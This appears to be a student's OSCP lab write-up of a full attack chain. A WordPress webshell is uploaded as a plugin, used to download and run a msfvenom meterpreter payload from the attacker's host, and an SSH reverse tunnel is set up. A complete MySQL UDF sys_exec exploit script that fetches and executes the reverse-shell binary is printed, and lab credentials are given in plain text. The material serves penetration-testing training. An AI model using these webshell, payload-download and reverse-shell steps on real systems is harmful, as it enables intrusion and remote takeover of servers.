24.5.1.1

# 24.5.1.1.1. Modify the original Python exploit and capture the reverse shell.

### Obtain a shell
Convert the seclist WordPress webshell file plugin-shell.php to a zip file
```plaintext
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ sudo zip plugin-shell.zip plugin-shell.php
```
![8aee6a1a261b8826976823d15d69da63.png](917e81df190144c6b76399a21b955a84.png)

Login to the Wordpress admin interface. We already know the creds are `wp_ajla_admin:!love29jan2006!`
![010a80ef9e6ca673c7fb9c3f43ddb3db.png](9b13547d9c444ee19b0346939e342db0.png)

Click 'Add New' in Plugin menu
![2821ed57131cfd84faa2ea97c3aa70c4.png](1104f67329d04990a7de6985b5b382a8.png)

Click 'Upload a New Plugin'
![5f73083ceb068b6d79f02763c29c0ce5.png](138aef2d4a3a4fa98515252b96aa3164.png)

Open the plugin-shell.zip file
![b0f122cb13abfb39cfdd45d8aeec9d43.png](94362e8710a743cf94206540ef58d114.png)

Install. There is no need to activate the plugin!
![2c108708d30cee3a59017f6270528c5c.png](226a4f0968a94642a66c45c4d1d5ccb8.png)

Now we can attempt to run system commands on the WordPress target using curl. Try running 'whoami'
```plaintext
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
```
![c79697c7e15fc9e9256f0d3ecc2f4687.png](54d54e6ef65b42f393e7c57f7fc9f79a.png)

Now that we know we can run system commands, we will upload a meterpreter payload and obtain a reverse shell. First, generate the meterpreter payload with msfvenom
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.119.214 lport=443 -f elf > shell.elf
```
![620ed14b2edcbf7da33c0c0d85ebaf35.png](323b77ba0d1e4671a290832958c38e73.png)

Start a web server to allow the Wordpress target to download the shell
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ sudo python3 -m http.server 80
```
![a384bbb0b73026732ed99cef5b098e77.png](a42fe0d35c334e18bc75632fd6233ab9.png)

Use curl to instruct the WordPress target to download the shell.elf file from Kali
```plaintext
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.214/shell.elf
```
![98cef36ede6a9e4e31adef452961c17d.png](7122384aef6e46f8af2ca08efd71c698.png)

Check the Python webserver log and verify we see an entry
from the WordPress target requesting shell.elf
![de9cd7a1be4bb1ad10c492ea3b2535c6.png](bdfb00b5b121413b95ce78656e9a45fe.png)

Make the shell executable
```plaintext
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
```
![b145eeac35ea0b46dd3ac5838e23f334.png](a3d64eeb8c914e148001557f67e2f546.png)

Start a meterpreter payload listener
```plaintext
kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
> set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
> set LHOST 192.168.119.214;\
> set LPORT 443;\
> run"
```
![316f00bc1741e2798d18e52e9f2b3996.png](4f1a6f708bb54e8ea063341ac73580cc.png)

Obtain the reverse shell by executing shell.elf on the WordPress target
```plaintext
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
```
![142c846a29e31dff9d94b2a26c8d0029.png](d75e1290bf2f466490a551c92d9e70ac.png)

We have captured a shell on the meterpreter
![729b1512c9b6c317e0b3edefedc1b948.png](dc88b07ddb0147e89b1c1119381a4bd3.png)

To prevent SSH from asking us a password, we will generate ssh keys on the WordPress host, configure Kali to accept a login from the newly-generate key (and only allow port forwarding), and modify the ssh command one more time to match our changes.

Here we will generate the ssh keys on the WordPress host
`mkdir keys`
`cd keys`
`ssh-keygen`
Enter file in which to save the key: `/tmp/keys/id_rsa`
`cat id_rsa.pub`
```plaintext
sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0ShP8xB+339aTQstER1Jsqa/cGMGEo735gY7BRC3xTgwO1XeIMUzAzrCr+DYXxrgWC8sAGRxqcnCGaYeBE1tmZOGP/ltj6byv7yap+z/s+eHxVRiG/oSikszp6i8rvtbv/wBIqeP0afq4NPjtCjAyB2w/4aUIQiRgUb9Uj3Ajgilqk4zIXS6xiRMvOOxKql2EtQEv1qZKs9Hym6bWLU7Ank1CsfHYVTTCYzxcUe/QMu6DZ6KM+8s0l3/3JtGsfU18+iBNhcozvYl0cYnHWvrvhJ7u4JsMqatUywDAnkD/5jsVsPVFRKkrJKuLvhR/4rb0CLTNEzF2raktcgkdJ2zP www-data@ajla
```
![6f2208c42d88c116a030995022755357.png](411af5d407d3461eb714ee45d6092bfd.png)

Now configure Kali to accept a login from the newly-generate key (and only allow port forwarding), and restart ssh
```plaintext
kali@kali:~$ cat ~/.ssh/authorized_keys 
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHKVrr988Eh9oke/2P/H/hEfHVv8kSaF1HmHYA/NbnnzAsJ9u2J54fyH6/o3CrCZ8/K/0TT+u/EuGtcIHZUcvgfqfQKhq5FWUU9zSz7ZJefH5+jiNWf3tnaeulNJS+WUqcGD8LD+fUKhenFNtx0kz/xWiFyBCOzPkySDyLKP30jC96WNphO6qMQ3Z/2oOShcu0k0+5XbjWPVTIWUwBYZMi2BOlXpYtPHnLNK/eS8esNFZlInvdZJs3qjHp3NEFz6/9dMBd3vSMJzKbZZOu9SxYklpJby1GNf6dydboR2mITs7Ld5q3um9Y91O2lG2+Wf2g1PdOKnQ1FqKvaNnAJdU51 www-data@ajla
kali@kali:~$ sudo systemctl start ssh.service
[sudo] password for kali: 
```
![bc18600a31c5b81c30e18e4163aa1cde.png](49ad3fd8372841f0a25b56fa14a6cf07.png)

Run the ssh command in the Wordpress meterepreter shell
```plaintext
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.214 
```
![d8e9b8ffa1e294ee03c958205efb4635.png](634e9b2f1bb64c0aaece2ffa11ed466d.png)


Verify that the ports are open on our Kali machine
```plaintext
kali@kali:~$ sudo netstat -tulpn
```
![db1a9193a525b5192900e57e53c7f92e.png](6141bdcf257742cbb093ab147cb4106e.png)

Before we run the python exploit, close the Windows meterpreter shell and rerun it. Also ensure that a web server is running on Kali where the shell.elf file is located
![175e207338338db44438b8e783a269d6.png](597e69c00b3f413f8049fa4e0c562ac9.png)
![6409447aabca9bd7b0e807d2b23a46b2.png](ebdec27470734fac8c0fc303f97ef719.png)

Run the python exploit
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ python exploit_46249.py 
```
![cdd122e2e4fe50fca52f557976afd657.png](412d25454af44515bfbd105be916e525.png)

We have captured a shell on the meterpreter as user mysql
![cb2b7bec44585290d6417f62eefebd69.png](0031ec2b2a9e49589571f5f624ee0334.png)

We see the communication on the python server
![ad13dbb20c9a1cb684b0722b3c860e8d.png](0979fae69b2d4011a9315709269e7664.png)

By the way, here is the python exploit code:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ cat exploit_46249.py 
#!/usr/bin/python                                                                                                                                                                                  
                                                                                                                                                                                                   
# Exploit Title: MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit                                                                                      
# Date: 24/01/2019                                                                                                                                                                                 
# Exploit Author: d7x                                                                                                                                                                              
# Vendor Homepage: https://www.mysql.com                                                                                                                                                           
# Software Link: www.mysql.com                                                                                                                                                                     
# Version: MySQL 4.x/5.x                                                                                                                                                                           
# Tested on: Debian GNU/Linux 8.11 / mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3                                                                             
# CVE : N/A                                                                                                                                                                                        
                                                                                                                                                                                                   
'''                                                                                                                                                                                                
*** MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit ***                                                                                               
                                                                                                                                                                                                   
                                                                                                                                                                                                   
UDF lib shellcodes retrieved from metasploit                                                                                                                                                       
(there are windows .dll libraries within metasploit as well so this could be easily ported to Windows)                                                                                             
                                                                                                                                                                                                   
Based on the famous raptor_udf.c by Marco Ivaldi (EDB ID: 1518)                                                                                                                                    
CVE: N/A                                                                                                                                                                                           
References:                                                                                                                                                                                        
https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html                                                                                                                                   
https://www.exploit-db.com/exploits/1518
https://www.exploit-db.com/papers/44139/ - MySQL UDF Exploitation by Osanda Malith Jayathissa (@OsandaMalith)

Tested on 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux

@d7x_real
https://d7x.promiselabs.net
https://www.promiselabs.net
'''


import sys
import subprocess
import platform, random
import argparse
import os
import re
import pty

shellcode_x32="7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000d83b000000000000000000004000380009004
...
0000000000000000000000000000000000e43a000000000000f100000000000000000000000000000001000000000000000000000000000000";
shellcode_x64 = "7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000d83b000000000000000
...
000000000000000000000000000000000000e43a000000000000f100000000000000000000000000000001000000000000000000000000000000";


shellcode = shellcode_x32
if (platform.architecture()[0] == '64bit'):
 shellcode = shellcode_x64

# MySQL username and password: make sure you have FILE privileges and mysql is actually running as root
username='root'
password='BmDu9xUHKe3fZi3Z7RdMBeb'

if not password:
        password=''

# 1. The shellcode is from a hex file that was generated according to PWK PDF training manual section 24.3.2
# 2. Ensure a web server was started (ie. python3 -m http.server 80) at where the payload (ie. shell.elf) is located
# 3. Ensure a meterpreter listener has been started, eg:
# sudo msfconsole -q -x "use exploit/multi/handler;\
# set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
# set LHOST 192.168.119.214;\
# set LPORT 443;\
# run"

# Verify where the plugin directory is set to
cmd='mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "select @@plugin_dir;"'
plugin_str = subprocess.check_output(cmd, shell=True)
plugin_dir = re.search('/(.*)', plugin_str)
res = bool(plugin_dir)

if not res:
 print "Error: could not locate the plugin directory"
 os._exit(1)

plugin_dir_ = plugin_dir.group(0)
print "Plugin dir is %s" % plugin_dir_

# Full path and file to save the udf so file to
udf_filename = 'udf_sys_exec.so'
udf_outfile = plugin_dir_ + udf_filename

# Create a UDF libary
print "Trying to create a udf library...";
os.system('mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G;"' % udf_outfile)

# Create sys_exec
print "Trying to create sys_exec..."
os.system('mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)

# Check if sys_exec was created
print "Checking if sys_exec was created..."
cmd='mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "select * from mysql.func where name=\'sys_exec\';"'
res = subprocess.check_output(cmd, shell=True);

if (res == ''):
        print "sys_exec was not found (good luck next time!)"


# Make the sys_exec UDF call.
os.system('mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "select sys_exec(\'wget http://192.168.119.214\');"')

# Download the payload
os.system('mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "select sys_exec(\'wget http://192.168.119.214/shell.elf\');"')

# Make the file executable
os.system('mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "select sys_exec(\'chmod +x ./shell.elf\');"')

# Execute the shell on Zora
os.system('mysql --host 127.0.0.1 --port=13306 -u root -p' + password + ' -e "select sys_exec(\'./shell.elf\');"')
```

## 24.5.1.1.2 The original UDF exploit is advertised as a privilege escalation exploit. Why are we getting an unprivileged shell?